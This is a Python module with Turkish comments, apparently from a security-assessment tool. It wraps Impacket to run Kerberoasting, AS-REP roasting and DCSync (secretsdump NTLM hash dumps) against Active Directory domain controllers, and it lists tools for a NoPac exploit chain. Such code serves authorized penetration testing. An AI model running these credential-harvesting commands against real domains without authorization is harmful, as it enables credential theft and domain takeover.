"""Impacket tabanlı AD görevleri (subprocess sarmalayıcı).

Script çözümleri sırayla denenir:
  1) PATH'teki console script'ler  (pip install impacket → impacket-GetUserSPNs)
  2) PATH'teki .py sürümleri       (GetUserSPNs.py)
  3) Debian paket yolları          (/usr/share/doc/python3-impacket/examples/...)

Şifre hiçbir zaman loglanmaz: ProcessRunner'a redact ile iletilir ve çıktı
üzerinde de maskelenir.
"""

import shutil
from pathlib import Path

from app.config import settings
from app.core.exceptions import ScannerError
from app.core.process_runner import ProcessRunner
from app.scanners.base import BaseScanner

_CANDIDATES: dict[str, list[str]] = {
    "GetUserSPNs": [
        "impacket-GetUserSPNs", "GetUserSPNs.py",
        "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py",
        str(Path.home() / ".local/bin/GetUserSPNs.py"),
    ],
    "GetNPUsers": [
        "impacket-GetNPUsers", "GetNPUsers.py",
        "/usr/share/doc/python3-impacket/examples/GetNPUsers.py",
        str(Path.home() / ".local/bin/GetNPUsers.py"),
    ],
    "secretsdump": [
        "impacket-secretsdump", "secretsdump.py",
        "/usr/share/doc/python3-impacket/examples/secretsdump.py",
        str(Path.home() / ".local/bin/secretsdump.py"),
    ],
    # Sömürü (NoPac) zinciri — yalnızca exploit_enabled=true iken kullanılır
    "addcomputer": [
        "impacket-addcomputer", "addcomputer.py",
        "/usr/share/doc/python3-impacket/examples/addcomputer.py",
        str(Path.home() / ".local/bin/addcomputer.py"),
    ],
    "getTGT": [
        "impacket-getTGT", "getTGT.py",
        "/usr/share/doc/python3-impacket/examples/getTGT.py",
        str(Path.home() / ".local/bin/getTGT.py"),
    ],
    "getST": [
        "impacket-getST", "getST.py",
        "/usr/share/doc/python3-impacket/examples/getST.py",
        str(Path.home() / ".local/bin/getST.py"),
    ],
}


def _resolve_cmd(tool: str) -> list[str]:
    """Çalıştırılacak komut önekini bulur: [exe] veya [python3, script].

    .py dosyaları HER ZAMAN `python3` ile çalıştırılır: Debian örnek
    script'lerinin shebang'i `#!/usr/bin/env python` olabilir (python yok).
    """
    for cand in _CANDIDATES[tool]:
        path = shutil.which(cand) if "/" not in cand else (cand if Path(cand).is_file() else None)
        if not path:
            continue
        if path.endswith(".py"):
            return ["python3", path]
        return [path]
    raise ScannerError(
        f"{tool} bulunamadı — Impacket kurulumu gerekli "
        f"(kurulum: pip install impacket)"
    )


# Impacket örnekleri hata durumunda bazen exit 0 ile döner ve mesajı
# stdout'a `[-] ...` olarak yazar — bu imzalar ayrıca başarısızlık sayılır.
_FAIL_MARKERS = (
    "connection refused", "errno 111", "timed out", "timeout",
    "unreachable", "no route to host", "cannot contact",
    "unknown domain", "unable to find", "invalid credentials",
    "authentication failed", "kdc_err", "name or service not known",
    "temporary failure in name resolution",
)


def _failure_marker(output: str) -> str | None:
    # hash satırları base64 içerir — "timeout" gibi kelime tuzakları olabilir
    lines = [l for l in output.splitlines() if not l.startswith("$krb5")]
    low = "\n".join(lines).lower()
    return next((m for m in _FAIL_MARKERS if m in low), None)


def _failure_detail(stdout: str, stderr: str, returncode: int) -> str:
    """Hata mesajı: genelde son satırdaki `[-] ...` çizgisidir."""
    for line in reversed((stdout + "\n" + stderr).splitlines()):
        s = line.strip()
        if s:
            return s[:300]
    return f"exit {returncode}"


def _check_result(tool: str, returncode: int, stdout: str, stderr: str) -> None:
    marker = _failure_marker(stdout + "\n" + stderr)
    if returncode != 0 or marker:
        raise ScannerError(
            f"{tool} başarısız: {_failure_detail(stdout, stderr, returncode)}"
        )


class ImpacketScanner(BaseScanner):
    name = "impacket"

    async def scan(self, target: str, **kwargs):
        """Tekil 'scan' arayüzü bu araç için yok — AD modülü görev bazlı
        metodları (kerberoast/asrep/dcsync) kullanır."""
        raise ScannerError(
            "ImpacketScanner tekil scan desteklemez; "
            "kerberoast/asrep/dcsync metodlarını kullanın."
        )

    # ---------------------------------------------------------- kerberoast
    async def kerberoast(
        self, target: str, domain: str, username: str, password: str,
        timeout: int | None = None,
    ) -> tuple[str, str | None]:
        """GetUserSPNs -request: SPN'li hesaplar + TGS hash'leri.

        Dönen: (stdout (tablo), hash dosyası yolu | None)
        """
        import uuid
        out = Path(settings.raw_output_dir) / f"ad_kerberoast_{uuid.uuid4().hex[:8]}.txt"
        out.parent.mkdir(parents=True, exist_ok=True)
        cmd = _resolve_cmd("GetUserSPNs") + [
            "-dc-ip", target,
            "-request",
            "-outputfile", str(out),
            f"{domain}/{username}:{password}",
        ]
        result = await ProcessRunner.run(
            cmd, timeout=timeout or settings.ad_timeout_sec, redact=(password,)
        )
        _check_result("GetUserSPNs", result.returncode, result.stdout, result.stderr)
        return result.stdout, str(out) if out.exists() and out.stat().st_size else None

    # ------------------------------------------------------------- as-rep
    async def asrep(
        self, target: str, domain: str, username: str, password: str,
        timeout: int | None = None,
    ) -> tuple[str, str | None]:
        """GetNPUsers -request: pre-auth kapalı hesaplar + TGT hash'leri."""
        import uuid
        out = Path(settings.raw_output_dir) / f"ad_asrep_{uuid.uuid4().hex[:8]}.txt"
        out.parent.mkdir(parents=True, exist_ok=True)
        cmd = _resolve_cmd("GetNPUsers") + [
            "-dc-ip", target,
            "-request",
            "-outputfile", str(out),
            f"{domain}/{username}:{password}",
        ]
        result = await ProcessRunner.run(
            cmd, timeout=timeout or settings.ad_timeout_sec, redact=(password,)
        )
        _check_result("GetNPUsers", result.returncode, result.stdout, result.stderr)
        return result.stdout, str(out) if out.exists() and out.stat().st_size else None

    # ------------------------------------------------------------- dcsync
    async def dcsync(
        self, target: str, domain: str, username: str, password: str,
        timeout: int | None = None,
    ) -> str:
        """secretsdump -just-dc-ntlm: NTDS NTLM hash dökümü (stdout)."""
        cmd = _resolve_cmd("secretsdump") + [
            "-just-dc-ntlm",
            f"{domain}/{username}:{password}@{target}",
        ]
        result = await ProcessRunner.run(
            cmd, timeout=timeout or settings.ad_timeout_sec, redact=(password,)
        )
        _check_result("secretsdump", result.returncode, result.stdout, result.stderr)
        return result.stdout
